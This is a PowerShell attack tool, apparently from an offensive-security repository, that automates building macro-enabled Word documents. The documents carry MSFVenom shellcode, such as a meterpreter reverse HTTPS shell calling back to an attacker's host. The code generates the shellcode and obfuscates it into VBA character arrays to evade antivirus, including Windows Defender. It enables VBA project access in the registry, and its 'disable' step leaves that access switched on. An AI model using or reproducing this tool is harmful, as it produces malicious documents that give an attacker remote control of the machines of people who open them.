function Invoke-Vulcan {
    <#
    .SYNOPSIS
        Automate the creation of macro-enabled Word documents that - at the time of writing - evades most AVs, including Windows Defender.

        Author: Alexandre Teyar (@aress31)
        License: BSD 3-Clause
        Required Dependencies: Windows Subsystem for Linux (WSL), BadAssMacros
        Optional Dependencies: None

    .DESCRIPTION
        Using MSFVenom and BadAssMacros, creates a macro-enabled Word document that - at the time
        of writing - evade most AVs, including Windows Defender.

    .PARAMETER OutputDirectory
        Folder to output files too.
    
    .PARAMETER OutputPrefix
        Prefix to add to output files.

    .PARAMETER Payload
        Specifies the MSFVenom payload to use.

    .PARAMETER PayloadOptions
        Specifies the options to use for the selected Payload.

    .PARAMETER Template
        Specifies the VBA template to use.

    .PARAMETER Treshold
        Specifies the threshold to use before breaking the shellcode array lines.
  
    .EXAMPLE
        PS C:\> Invoke-Vulcan -Payload "meterpreter/reverse_https" -PayloadOptions "LHOST=192.168.0.24 LPORT=443 EXITFUNC=thread" -Template "./assets/templates/indirect.vba"

        Executes MSFVenom with the specified payload and options, pass the generated raw shellcode to BadAssMacros to obfuscate it in order to evade AVs,
        and then removes creates an empty macro-enabled Word document containing the processed macro.
    #>

    [CmdletBinding(PositionalBinding = $false)]
    param(
        [ValidateScript({ Test-Path -Path $_ -PathType Container })]
        [String]
        $OutputDirectory = $(Get-Location),

        [String]
        $OutputPrefix,

        [Parameter(Mandatory)]
        [String]
        $Payload,

        [Parameter(Mandatory)]
        [String]
        $PayloadOptions,

        [Parameter(Mandatory)]
        [ValidateScript({ Test-Path -Path $_ -PathType Leaf })]
        [String]
        $Template,
        
        [int]
        $Treshold = 72
    )

    begin {
        $PayloadOutput = "${env:TEMP}\msfvenom_$(Get-Date -Format yyyy-MM-dd_hh-mm-ss).bin"
        $MacroOutput = "${env:TEMP}\macros_$(Get-Date -Format yyyy-MM-dd_hh-mm-ss).vba"
        
        $Match = $payloadOptions | Select-String -Pattern "LHOST=(\d{1,3}.\d{1,3}.\d{1,3}.\d{1,3})"
        $LHOST = $match.matches.groups[1].Value
        $Match = $PayloadOptions | Select-String -Pattern "LPORT=(\d{1,5})"
        $LPORT = $match.matches.groups[1].Value
        
        if ($OutputPrefix) {
            Resolve-Path `
                -Path $(Join-Path -Path $OutputDirectory "${OutputPrefix}.doc") `
                -ErrorAction SilentlyContinue -ErrorVariable _frperror
        }
        else {
            Resolve-Path `
                -Path $(Join-Path -Path $OutputDirectory "$($Payload.Replace('/', '.')).${LHOST}-${LPORT}.$(Get-Date -Format yyyy-MM-dd_hh-mm-ss).doc") `
                -ErrorAction SilentlyContinue -ErrorVariable _frperror
        }

        $WordOutput = $_frperror[0].TargetObject

        Write-Output "[+] Enabling trust access to VBA Project Object Model in Microsoft Word..."
        Set-ItemProperty -Path "HKCU:\Software\Microsoft\Office\16.0\Word\Security" -Name "AccessVBOM" -Value 1
    }

    process {
        Create_Payload -Payload $Payload -PayloadOptions $PayloadOptions -PayloadOutput $PayloadOutput
        Create_MacroFromTemplate -ShellCode $PayloadOutput -Template $Template -Treshold $Treshold
        Create_WordDocument -MacroOutput $MacroOutput -Output $WordOutput
    }

    end {
        Write-Host "[-] Removing payload file..."
        Remove-Item -Path $PayloadOutput -Force
        Write-Host "[-] Removing VBA macro file..."
        Remove-Item -Path $MacroOutput -Force
        
        Write-Output "[+] Disabling trust access to VBA Project Object Model in Microsoft Word..."
        Set-ItemProperty -Path "HKCU:\Software\Microsoft\Office\16.0\Word\Security" -Name "AccessVBOM" -Value 1
    }
}

function Create_Payload($Payload, $PayloadOptions, $PayloadOutput) {
    Write-Host "[i] Creating payload..."
    $WSLPath = wsl.exe --exec wslpath -a $PayloadOutput
    $Command = "wsl.exe --exec msfvenom -p $Payload $PayloadOptions -f raw -o $WSLPath"

    Write-Host "[i] Running command: $Command"
    Invoke-Expression -Command $Command # | Out-Null
    Write-Host "[i] Payload written to: $PayloadOutput"
}

function Convert-RawToByteArray($ShellCode, $Treshold) {
    $Bytes = [io.file]::ReadAllBytes($ShellCode)

    $i = 0
    
    foreach ($x in $Bytes) {
        if ($i -eq $Treshold) {
            $FormattedBytes += "${x}, _`r`n"
            $i = 0
        } 
        else {
            $FormattedBytes += "${x},"
            $i += 1
        }
    }
    
    return $FormattedBytes = $FormattedBytes.Substring(0, $FormattedBytes.Length - 1)
}

function Convert-RawToCharHexArray($ShellCode, $Treshold) {
    $Bytes = [io.file]::ReadAllBytes($ShellCode)
    $HexArray = ([System.BitConverter]::ToString($Bytes)).Split('-')

    $i = 0

    foreach ($x in $HexArray) {
        if ($i -eq $Treshold) {
            $FormattedBytes += "Chr(&H${x}), _`r`n"
            $i = 0
        } 
        else {
            $FormattedBytes += "Chr(&H${x}),"
            $i += 1
        }
    }

    $ForbiddenChars = @{
        "00" = "0"
        "01" = "1"
        "02" = "2"
        "03" = "3"
        "04" = "4"
        "05" = "5"
        "06" = "6"
        "07" = "7"
        "08" = "8"
        "09" = "9"
        "0A" = "A"
        "0B" = "B"
        "0C" = "C"
        "0D" = "D"
        "0E" = "E"
        "0F" = "F"
    }

    foreach ($x in $ForbiddenChars.GetEnumerator()) {
        $FormattedBytes = $FormattedBytes.Replace($x.Name, $x.Value)
    }

    return $FormattedBytes.Substring(0, $FormattedBytes.Length - 1) 
}

function Create_MacroFromTemplate($ShellCode, $Template, $Treshold) {
    Write-Host "[i] Creating VBA macro..."
    $PayloadArray = Convert-RawToCharHexArray -ShellCode $ShellCode -Treshold $Treshold
    Set-Content -Path $MacroOutput -Value (Get-Content -Path $Template).Replace("PAYLOAD", $PayloadArray)

    Write-Host "[i] VBA macro written to: $MacroOutput"
}

function Create_WordDocument($MacroOutput, $Output) {
    Write-Host "[i] Creating macro-enabled Word document..."
    $Word = New-Object -ComObject Word.Application
    $Doc = $Word.Documents.Add()

    $DocModule = $Doc.VBProject.VBComponents.Add(1)
    $DocModule.CodeModule.AddFromFile($MacroOutput)

    Write-Host "[+] Word document written to: $Output" 
    $Doc.SaveAs($Output, 0)

    $Doc.Close()
    $Word.Quit()
}